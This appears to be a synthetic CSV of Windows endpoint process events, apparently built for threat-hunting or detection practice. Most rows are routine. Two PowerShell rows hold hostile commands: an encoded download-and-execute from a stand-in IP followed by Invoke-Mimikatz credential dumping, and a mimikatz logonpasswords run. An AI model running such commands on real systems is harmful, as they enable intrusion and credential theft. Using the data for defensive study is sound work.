TimeGenerated,Timestamp,DeviceName,DeviceId,AccountName,AccountDomain,FileName,FolderPath,ProcessCommandLine,ProcessId,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,InitiatingProcessSHA256,InitiatingProcessSignatureStatus,InitiatingProcessSignerType,ProcessIntegrityLevel,ProcessTokenElevation,Type
2026-04-29T12:08:19Z,2026-04-29T12:08:19Z,LAP-SALES-03,dev-lap-sales-03,rmorales,CORP,Teams.exe,C:\Program Files,Teams.exe,1631,30d7d4eacf0d85118a3f9d183e70eae54cb9381f2f5d68e1e402b676f43fcec2,0b8b97d093ca741af519ac9e44ae412423cb0276,60879dfb2807c2731a74dfb7187376ac,4506785,RuntimeBroker.exe,C:\Windows,C:\Windows\RuntimeBroker.exe,6874,rmorales,2a41565fbc1b70b9a6b29740606b3ce3810de040fe3f55177db41b1a53a409bf,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:08:23Z,2026-04-29T12:08:23Z,WS-OPS-02,dev-ws-ops-02,dkim,CORP,msedge.exe,C:\Program Files,msedge.exe,7106,91a3a45a0fe45092cf57b5ff624073b692226876f8a5255e4b55b6f41ad7043d,37b2e6c48e82bad1d5ccd6b23d1bbf5a5c2a92fd,f1cced97dbaa870dc8f150989ddf837a,2039250,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9585,dkim,cb9f454aef5b2db4d03e7e84300ae94048a53c49db293dbf3356787d35c359b4,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:08:34Z,2026-04-29T12:08:34Z,WS-MKT-02,dev-ws-mkt-02,rmorales,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,1490,1b90cce05506b3e9b1d1e0133fdee71cd24ad7b1446e5300cca86420a5dce02e,3498f3b46bd993effd12c95803079e3428a09719,061a78677dc1ef29e18b34b788718e68,3610223,svchost.exe,C:\Windows,C:\Windows\svchost.exe,5188,rmorales,157b07d80b11526118f66cba2e15f87456ec2300ea3f6634b7ce8525ad816797,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:08:59Z,2026-04-29T12:08:59Z,WS-HR-03,dev-ws-hr-03,ehernandez,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,9331,e7f8b8b4bbda8c9b04814af960cb8a4f08e79d6ce9d69d1aa1bab8a4752ac0b1,7d9fe213dc2bd808f107e938eaf4bbfdebfb41c8,f8df5e6f59bb032ea1142d81d4d1954d,1525894,code.exe,C:\Windows,C:\Windows\code.exe,4902,ehernandez,76c42f3ff104da81130852fb1015605d68cb15e203e718728730dc257021de9f,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:09:36Z,2026-04-29T12:09:36Z,WS-OPS-01,dev-ws-ops-01,kpatel,CORP,explorer.exe,C:\Windows\System32,explorer.exe,9629,b4e7238999ecec4fa67413c429fbeb15b88bf5f1e698f1b3733e68e889484dbd,79053904655a9450ec3b83e2a03506c1bc0515fe,2e8033f444a89054beb35a4f84ed30f8,3987308,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3751,kpatel,89bdf61f1cc48a6b92ac88a87f410441b38c9df4169834c4676de0d0f26f1fec,Valid,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:09:40Z,2026-04-29T12:09:40Z,WS-IT-01,dev-ws-it-01,lwoods,CORP,code.exe,C:\Program Files,code.exe,2447,c35a1e24330a8e72b58c67f327df8b71c59996b1de2c046e08deadc4317a12c7,bfe34d95a6f8432d0fffd97e9467e10b1a015393,f844e3fff9922da2809f61686379218d,1814968,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7549,lwoods,0543f546848d840d9599ce1bdbc6dd1bc6c5e404a08208b294823cf139549e9b,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:12:02Z,2026-04-29T12:12:02Z,WS-DEV-02,dev-ws-dev-02,tnguyen,CORP,chrome.exe,C:\Program Files,chrome.exe,9909,445ec5fa509c85f807b14fcbb6d0479bd53ded3c4e04f115230acaa489258e6d,6df211933ed6f8b957d07ef3af54ad3572d12e41,ad7dc450d8001568ec82b486b8fdaa76,1005722,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7467,tnguyen,6972669561c241b4255255402458531ad5fc1c6286e6984d1572016046020103,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:12:20Z,2026-04-29T12:12:20Z,WS-FINANCE-01,dev-ws-finance-01,kpatel,CORP,msedge.exe,C:\Program Files,msedge.exe,3099,6f39f7e79086fbf9cfe8ac3165a6635a2212c7696e618a07188f368ab129c816,ad4dacc5851b528c434db67c967b4cdedf7b63c4,b26d4d49865833b45744510c83e5bd51,2096176,chrome.exe,C:\Windows,C:\Windows\chrome.exe,9810,kpatel,28fa7c1d2e74aa426ee8fa2a50eeeb1323034bf827f2439318663d085547d3f6,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:12:24Z,2026-04-29T12:12:24Z,WS-OPS-02,dev-ws-ops-02,mwhite,CORP,chrome.exe,C:\Program Files,chrome.exe,8695,af668a0516bd55a0438df68be7850139fab7c77d5f2016a123e214e46a702a40,31da933dbb7f4798d72d308bc702f7aaa2df8f8e,0065deff0f2b87d291d121d40c51aafe,4610215,svchost.exe,C:\Windows,C:\Windows\svchost.exe,2468,mwhite,d2a3ee71105f225a6716ce32409e46f4c4aa863f91fdf092c048c87ef7ed59ca,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:13:17Z,2026-04-29T12:13:17Z,WS-FINANCE-01,dev-ws-finance-01,jharris,CORP,msedge.exe,C:\Program Files,msedge.exe,1915,f32cae53376142684ccb0859045cedba2e459bdf94a6e888a8e1be07d8c69846,bce5e1e9fc1bdfa7bc26e9e4dc71e75104a2a3a9,952ec59ed4ac6d71da719da870b948d8,870929,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,5780,jharris,c97078293ac9b2c950c8fcb97c909572ac0eac2eefa0be58cb2dca90dd9bf20d,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:13:59Z,2026-04-29T12:13:59Z,WS-HR-03,dev-ws-hr-03,lwoods,CORP,powershell.exe,C:\Windows\System32,powershell.exe,9439,8dd902be9613d3960300c37fcfcd1f76ec90e09e2ff4df2a94ea1d256dd05eda,fa41997fa2ed321cd23c0c50a49028941553a00f,ce0ef414b032a092547506d19abdce2c,782565,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,2762,lwoods,01c615254156a1c3d69bf51e55937de7f5f75f222a2bc2fa191c274a0e0bbed7,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:14:17Z,2026-04-29T12:14:17Z,WS-HR-03,dev-ws-hr-03,ehernandez,CORP,Teams.exe,C:\Program Files,Teams.exe,8774,e378435135f2ec1481467e763da7fbb8cb28bf07bcc6cceb28e3ce60c0469e28,975398990dbb10a7fe56c8be42cba9ec94c57a19,f42f2beb5d7a8cb1b7e7cee7fe1d35f4,4142024,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7660,ehernandez,775cb9305d134d8b90bad05af39070d2dc43bfb53b816ba458bf83f62bc70384,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:14:24Z,2026-04-29T12:14:24Z,WS-FINANCE-01,dev-ws-finance-01,dkim,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,9665,a4661843394be5da9de102340240752b090b2cded78eb79e34caa2f8015e33ce,79b5517dff48959885d3870da8b06ea9ba62c491,cfbbe6fa8d5d585f8dbc67604acef7c4,3669247,svchost.exe,C:\Windows,C:\Windows\svchost.exe,7959,dkim,69c5e390799c42479e9ca59a6490b101291c32e736fc776aa8ddbe2101fa9856,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:14:33Z,2026-04-29T12:14:33Z,WS-IT-02,dev-ws-it-02,sthompson,CORP,svchost.exe,C:\Windows\System32,svchost.exe,2890,601946c3fdf53335360c234eb183fcb9246da5da3efc921241740b12b2e3d832,263ed6bd86943748f6fd579633177adbada2f35e,69ba2cf4d53795cadca9536d8e95c19c,243398,services.exe,C:\Windows,C:\Windows\services.exe,494,sthompson,7cbe464ca176151f528c933d14397cc768e0ee84489462c44cc644739ed03b5e,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:14:41Z,2026-04-29T12:14:41Z,SVR-DC-01,dev-svr-dc-01,olopez,CORP,conhost.exe,C:\Windows\System32,conhost.exe,1526,6a471ae6f7f4bf5321a6017083be723d3b5c0c68a8e947aefbd7ba0523fef0ed,321f9835b2c83ec19cfb4c18b0acd89a90515a46,87c9d8246d4203870839e68282f29abe,2461999,svchost.exe,C:\Windows,C:\Windows\svchost.exe,5481,olopez,3d07a3e56f36958e1c6b71e91b9fbb16b7fb69e0a809f1899a9f7c01e76faeaa,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:16:44Z,2026-04-29T12:16:44Z,WS-OPS-02,dev-ws-ops-02,ehernandez,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,5160,8e60f159f2f6022fe7edf2f6cd5b3673c3101b109e6ca8a8adca7085ff41b968,bc9c12e35d41b2c33d16acbcbb12604f7e1ded78,e84ab69c20ee80ee1d150cd5849d1e55,1877884,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5288,ehernandez,71800415f51677f2c1c182bf17dca3b88f9d60cc4bc731d1ef14840459f875ab,Microsoft,Microsoft,High,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:17:00Z,2026-04-29T12:17:00Z,WS-MKT-01,dev-ws-mkt-01,agarcia,CORP,notepad.exe,C:\Windows\System32,notepad.exe,8053,c40dc53bfabeb2704f47c135e01da352b250863e2dfeb7f928a7abfb0afc460c,4828d68dc65e15a707a29e80290d779bd2a257cc,0cb3609a08ccbd2602536a54c91fa829,3722232,svchost.exe,C:\Windows,C:\Windows\svchost.exe,9054,agarcia,2d24a2f5dfbc0f03221855667dfaf8620cb54b8340c69f81f75f738c6bdc2555,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:17:02Z,2026-04-29T12:17:02Z,WS-IT-02,dev-ws-it-02,sthompson,CORP,OneDrive.exe,C:\Program Files,OneDrive.exe,9945,7ae3580c84db826bd4ee8db0fb7d135d47e49f336e5849d32cef5b79fd4a12b4,f061322d0a8982b5d3a44588f54bb92330842b0f,a1ea3d0c1ecd86097e1de62784579722,1063167,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6894,sthompson,927e5147acd4bd0fd49214f61e892ab9adcd188086b5a4987a9e809530c79b40,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:17:40Z,2026-04-29T12:17:40Z,WS-MKT-02,dev-ws-mkt-02,kpatel,CORP,powershell.exe,C:\Windows\System32,powershell.exe -nop -ExecutionPolicy Bypass -EncodedCommand aWV4IChbU3lzdGVtLk5ldC5XZWJDbGllbnRdOjpEb3dubG9hZFN0cmluZygiaHR0cHM6Ly8yMDMuMC4xMTMuOTAvc3Q1LnBzMSIpKTtJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw==,4321,60183440501d94ecc7a5d1ff5e6566d8b140dc601fcf65a2f357c05069261e1f,9041147e5fb0777a0c0c8c597f66c004bdf3a6cf,a5eda11743811fa08787fbaf1f404de1,524288,cmd.exe,C:\Windows,C:\Windows\cmd.exe,1234,kpatel,fcd1f061cd9070bb33b3b06859fcdacd5139f8f30b491e703b34628387fe2b67,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:17:59Z,2026-04-29T12:17:59Z,WS-FINANCE-01,dev-ws-finance-01,mwhite,CORP,code.exe,C:\Program Files,code.exe,8514,4c9ab89cd5f280d1a3791b16d1b46aa73d41f6dc93f199cf32fa99c8b2dad463,b8eabb146a0dcfc44c14afda1c6c93f4dc61a137,0b4f9ecb6850328ba49f45b2bbf09a93,2948720,chrome.exe,C:\Windows,C:\Windows\chrome.exe,6557,mwhite,3fbe12fb50ee1b3b76732a023dfc2bf178e9fb27f9fb3c94cd33b578f9b3239a,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:18:49Z,2026-04-29T12:18:49Z,WS-FINANCE-01,dev-ws-finance-01,ehernandez,CORP,Teams.exe,C:\Program Files,Teams.exe,7372,c3039a5e64af48c6106960f4bf5a7508126fb2edab4e84514668614b3b795a61,42e11cbe28fbb0c7a350f720dabfa58f43a56307,b76e1803efe1562c0d361b4cff776617,1216981,svchost.exe,C:\Windows,C:\Windows\svchost.exe,8421,ehernandez,5713e5a81a679e1e58f96039e118c8e6d80aacfec8a9686967198a65485c31b9,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:19:06Z,2026-04-29T12:19:06Z,WS-OPS-01,dev-ws-ops-01,olopez,CORP,code.exe,C:\Program Files,code.exe,3242,890dd6925b82565e31b5262bad0d6f4bf38f7d9fb5f0bf626150211165205bc6,7c21e5657bac710a6e65948e1692a9af889ed541,af8665a4489656d344f7c3be1a3e82d1,3114193,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3198,olopez,a9b17cc4e2f3a2b6986d564a5b1bc2a8c0c372c2b758ee012184bcf441cbb07b,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:19:13Z,2026-04-29T12:19:13Z,WS-IT-01,dev-ws-it-01,sthompson,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,9371,7c31d0bb7bf8aa6d007e6616afa1776bb2087a239650c7d01a69e881bd7d6a3f,43d79d55e45f00a329fc1dd2afda34ce26c89573,41a9390a23ada7d66bda0b1a76da429d,714517,services.exe,C:\Windows,C:\Windows\services.exe,7553,sthompson,7033f0f27f9f4b851e7d39f02cb550adbefd32bcad3208212e0b549e121349c7,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:19:31Z,2026-04-29T12:19:31Z,SVR-DC-01,dev-svr-dc-01,tnguyen,CORP,msedge.exe,C:\Program Files,msedge.exe,2648,f2a256dfa9a370f7651c018710bc43c57b18a2373279a55764e0ae2d9214a0b6,c4cbe6c3198dafdbb36f5ca883e71fc371c6998f,7ae1552a5586ac00933b7422c5593622,3477893,svchost.exe,C:\Windows,C:\Windows\svchost.exe,4137,tnguyen,7be933041c658b0cd66d728c40f97f36b3451ff0a326b6ca879ccde4324337d2,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:20:00Z,2026-04-29T12:20:00Z,WS-IT-02,dev-ws-it-02,jharris,CORP,code.exe,C:\Program Files,code.exe,6736,d6634020e340057ae5f1fbcc250dac83dcc559941150e7dc25bf79a1991ef452,b1339144ba0e5cdb83b508b32acc8a5cb34d4a20,164d8cccb56c90125f1f48c04421707e,253172,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6390,jharris,3a4db5df02482a227493c9a3849a5be8bfd7e74b2579cc27e5825deaf057c2a5,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:20:19Z,2026-04-29T12:20:19Z,WS-HR-03,dev-ws-hr-03,tnguyen,CORP,explorer.exe,C:\Windows\System32,explorer.exe,3046,00d16107c12cf2c2e127d2defb250ef922817c78e98596a279f0b46d3f1bfb7d,189daab19983a7580fe6feeecae8ac932a30cd8d,ed71b23b98b0c0e2ab10b26d051f34c2,2231335,explorer.exe,C:\Windows,C:\Windows\explorer.exe,679,tnguyen,817c2963e11961c161c71b69161475c89c8cad879844c7ef32da5ffcbebb82b9,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:20:24Z,2026-04-29T12:20:24Z,SVR-DC-01,dev-svr-dc-01,agarcia,CORP,chrome.exe,C:\Program Files,chrome.exe,4388,985e971d98104722acc1c1ce7cbf37364c41006590236171366dce97c66cc2a2,4bc73019677cf9855acd15953c5aa9876feb5fd2,4c756d82e1625d1f1646a7ede05facf6,3919629,services.exe,C:\Windows,C:\Windows\services.exe,6364,agarcia,84e4f632c92629efafb67dea757881105b4d0d7d38a5a7ec1a20a52b63d9faaa,Microsoft,Microsoft,System,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:20:44Z,2026-04-29T12:20:44Z,WS-IT-01,dev-ws-it-01,kpatel,CORP,chrome.exe,C:\Program Files,chrome.exe,9292,c8d3f28ff7a7df05f887c0de8efe86770c58d239d3d243cb6c1eb91cafb02a78,f261a88d5f992a94147b59b6a8ed6263c531cb0e,338c08af67ed2b356061ab6285cd7776,1267889,svchost.exe,C:\Windows,C:\Windows\svchost.exe,5485,kpatel,810f51ee6f38002dbc4e48d63bbc7ef89a3147a53b46ef4bbacb254f4aba5167,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:21:01Z,2026-04-29T12:21:01Z,WS-FINANCE-01,dev-ws-finance-01,tnguyen,CORP,powershell.exe,C:\Windows\System32,powershell.exe,5925,32fb846746f1d245454cabff15c630eea18839bae3735085b5a093e83f938f33,817cab2ba9e64b91c7ad6d562053072ef3b48ca0,3e605737677146cbb09a6ea26f710580,4030873,svchost.exe,C:\Windows,C:\Windows\svchost.exe,6666,tnguyen,97651bcdd801997f882f9543950271e74ac446fee802245e90c0dd1433bbba6c,Valid,Microsoft,Low,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:21:14Z,2026-04-29T12:21:14Z,WS-MKT-01,dev-ws-mkt-01,agarcia,CORP,explorer.exe,C:\Windows\System32,explorer.exe,7303,193104215f1864d969711b333248976175a79b00116c9108cf66419650dd0a8d,901096fa87ff56a12cba0fd5b419e20798390fe5,fbed2a1f6bb4edd92b5546c5786c3013,4391926,code.exe,C:\Windows,C:\Windows\code.exe,3855,agarcia,b41f3132327c9ba965a818e86934b5a858288373213aebea19ac85425899de6e,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:21:20Z,2026-04-29T12:21:20Z,WS-IT-01,dev-ws-it-01,bsato,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,1806,3d65f54abb822aef03f2f9d53a52f4d1f87e2f4d1eee5b439f5d9f19f01502a6,d72a2fd0e111af086180ff706ee1dfde380d9a0a,24e7dfe009feaa7df2340b3f43e2e2fb,280067,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8598,bsato,ea1026fe130e4813e66c961f3a0b2da3dccdce0c52afe5e61b48544781d763b3,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:21:35Z,2026-04-29T12:21:35Z,WS-IT-02,dev-ws-it-02,ehernandez,CORP,chrome.exe,C:\Program Files,chrome.exe,4693,f5966c10dbaa782e9844b1861767147ad442bddb70fbb94b6f7e7fbdd35f5ae8,40c24f2ba9ca2db82b02d82d97588e5d177ac167,cb4e31b07dca9cbbdf9c9a3b3f8b50b1,1420108,svchost.exe,C:\Windows,C:\Windows\svchost.exe,6108,ehernandez,6144a7c50a2b35cccd7ad288a38fa71b5f696941039898b2f83e9ac38ca6eca9,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:21:38Z,2026-04-29T12:21:38Z,WS-IT-02,dev-ws-it-02,sthompson,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,4318,3859990e28601331b320afe349ff2273c206302a8d7d8b965590c1b4924090bf,133e3dda088c70a9f99d866b7bc1b10718c57a28,7ff49ed88b0f7e6bc8770cef70ae4415,2199867,explorer.exe,C:\Windows,C:\Windows\explorer.exe,360,sthompson,596118e3901103108f2b8b00d94e33aa868c5a6f8c3ed6f6d4c13b7a954840f5,Unsigned,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:22:40Z,2026-04-29T12:22:40Z,WS-MKT-01,dev-ws-mkt-01,sthompson,CORP,powershell.exe,C:\Windows\System32,"powershell.exe -nop -c ""& .\mimikatz.exe sekurlsa::logonpasswords""",4321,7ec7c0c9cfc7302ff363a3e666c67a26938605bcd168ceb63f1059a5b3d28530,79d0d29cc9aa9f15feed5aa1adf508428691e4cb,7cf3f916982730b20a02611a8f21a11f,524288,powershell.exe,C:\Windows,C:\Windows\powershell.exe,1234,sthompson,d3ae1d58e158ed5f671a784071f5244b06d996aa36a46077b2bbf7a119fc46ef,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:24:15Z,2026-04-29T12:24:15Z,SVR-WEB-01,dev-svr-web-01,rmorales,CORP,Teams.exe,C:\Program Files,Teams.exe,7382,d832b81379d1f787dfe306eb7cd87d5c88e908c282de6ffedfaac1b7a8bea8c9,31878f742cae9f47deb72bf6d7e7dd7f54a5686d,86706dea331cc46812910f754b844f14,2618598,services.exe,C:\Windows,C:\Windows\services.exe,8735,rmorales,fc3ff0834abb21d234f4c8f2bb59642d3e4951298dbd998672bc4317d144bfdf,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:24:17Z,2026-04-29T12:24:17Z,WS-IT-01,dev-ws-it-01,dkim,CORP,Teams.exe,C:\Program Files,Teams.exe,8437,116bfd2813e239580ddc3dee9fb4b248259be719b821cd952476079438201dcf,e5fe0aa8c31bbd1b5626be8bc476518db326eb58,ae9d6d9567abb540d42b233ba3f7abd9,265478,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6180,dkim,cc5b4eb2fe6d26e2999a66bd22e1ab90a198a1f4f0345d09982306350792fa74,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:25:30Z,2026-04-29T12:25:30Z,SVR-DC-01,dev-svr-dc-01,rmorales,CORP,chrome.exe,C:\Program Files,chrome.exe,5314,7a5a5378415729503d4838d458fffafc30a9bcd29f40925bf5e48d4ec04d4799,2941eb57f2f44ca23309bb35ccca70d25ae0e3c3,0746e0a052906fe65f52ea0f4ce9ea4f,2229396,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8163,rmorales,846d6c1c456db6c7beea457522101bda9969f888025a9618c6e51c83d1b4a0a9,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:25:30Z,2026-04-29T12:25:30Z,WS-IT-01,dev-ws-it-01,tnguyen,CORP,msedge.exe,C:\Program Files,msedge.exe,5366,365a20ccb094bc88c13ced4df7c3c1e89ebfb15205f31cfcf371c69617bb39f9,20ac18cbb0b8d1c27049adc355e46af7651023b6,6c6ba180b83245f4477ba85014170c04,1712251,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8517,tnguyen,2d7083de9d7c206cbbbfce75a6f00e8ed731d3e3ecf784101304951461613cda,Unsigned,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:25:49Z,2026-04-29T12:25:49Z,SVR-DC-01,dev-svr-dc-01,agarcia,CORP,powershell.exe,C:\Windows\System32,powershell.exe,9662,7c70fffd54fece4575fbbdd02e43e563d4881414630d4d1c0475d83af7e1ace0,eb185b324a58cfb4d83ad0650e8960aa4fe9c864,04133bdfb942942d5b8729c30b3c1284,678521,services.exe,C:\Windows,C:\Windows\services.exe,9139,agarcia,99e22509dcc70fd0300e168d2870e90f0ab9e29279cf78a3f0e833d2010adfb4,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:26:59Z,2026-04-29T12:26:59Z,WS-OPS-01,dev-ws-ops-01,ehernandez,CORP,Teams.exe,C:\Program Files,Teams.exe,1924,17e77a969d41da8cdd99d2f57e73a14fbfd05b577a6c9eda30a8aa3f880935b8,945ed7618213c2b80c0a6b41bd8cbb32ed248fcb,99088035d786411d043fea6cef5e07f1,4973913,svchost.exe,C:\Windows,C:\Windows\svchost.exe,3471,ehernandez,1dbb8ba3f43cddb544cdce33a9a456776ff414c74bb191272a2b5292a81f05e9,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:29:21Z,2026-04-29T12:29:21Z,WS-OPS-01,dev-ws-ops-01,tnguyen,CORP,OUTLOOK.EXE,C:\Program Files,OUTLOOK.EXE,2986,0848131a8632a3c246c992d7fc25db4ab7220a7f9d98d34509170d9dbd941bcc,2962191aed0b949b7c44ac9dd46302dd0c54d136,7693de463ed46815f85c2e9bf2bde5e6,2814319,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,8656,tnguyen,c3360f00f25967a044b648dd3a277d06b9be2986c2f766b32e09a1936525c981,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:29:37Z,2026-04-29T12:29:37Z,WS-DEV-02,dev-ws-dev-02,bsato,CORP,notepad.exe,C:\Windows\System32,notepad.exe,9055,bc5a2967def49d6c9f87c6293ad477e7605d477a0e56d4e4c24d34249c67c105,08e978718d7e0bceb8843031e1480fded06565d3,a256c43df8c39b204ca64f1809005785,3591721,OUTLOOK.EXE,C:\Windows,C:\Windows\OUTLOOK.EXE,3276,bsato,a0ad4ad6882a52e509a7eb1c533388f7841157808e68664e2f6ea46fed7069d0,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:29:55Z,2026-04-29T12:29:55Z,WS-IT-02,dev-ws-it-02,lwoods,CORP,chrome.exe,C:\Program Files,chrome.exe,1159,91ae0496ff51921d3d237f7af06fb43d5fdc065a5781084d7dd3f989aff0e9ba,c8ba54dd77d07596b88e6fdb632075bbcd48ca82,00b7b72468460d4caf312c62c2491191,4820074,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4109,lwoods,d6460e1dae15bf98dd67f399a93834e36afd73f405270774093ca86acbc6a895,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:31:42Z,2026-04-29T12:31:42Z,WS-FINANCE-01,dev-ws-finance-01,dkim,CORP,notepad.exe,C:\Windows\System32,notepad.exe,1080,9d27a11832e7a118e350c7897bc72964589f81c8b384c1f4e5fdaa3248ff595a,c911720d7c58f4d6b79d98ab57a01c31ee82fdcb,516d4a30a93d0803f6c080ca93a1cb6d,3553618,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8721,dkim,882c6a49689515d4281c355b31014e2512081202cea41424378dcfa23684a257,Unsigned,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T12:32:14Z,2026-04-29T12:32:14Z,SVR-DC-01,dev-svr-dc-01,kpatel,CORP,msedge.exe,C:\Program Files,msedge.exe,2859,f8f04a1afebec54927d4aab7992ee03ed495de682c86f38109078085c76a82cf,bc08cec4152e158510e4fb6db3958bff09a22051,cc63ea37e097470063c857b552d8a620,3604042,code.exe,C:\Windows,C:\Windows\code.exe,7822,kpatel,7252e0026718b88acf3cc500ebcbc8d8b7fda34b83044d65f093ce011443446e,Microsoft,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
